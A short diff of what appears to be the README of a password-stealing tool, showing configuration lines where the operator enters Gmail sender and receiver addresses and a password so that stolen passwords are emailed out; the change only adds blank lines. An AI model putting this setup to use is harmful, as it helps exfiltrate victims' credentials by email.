@@ -6,7 +6,11 @@ and dont forget to change https://www.google.com/settings/security/lesssecureapp
 
 Change In This Line::::
 addr_from = 'sendermailaddress@gmail.com'  # your email to send steal_password
+
+
 addr_to = 'Reciversmailaddress@gmail.com '  # receive email
+
+
 password = 'password'  # Your gmail password
 
 please change below line if u are Not a Gmail User:::
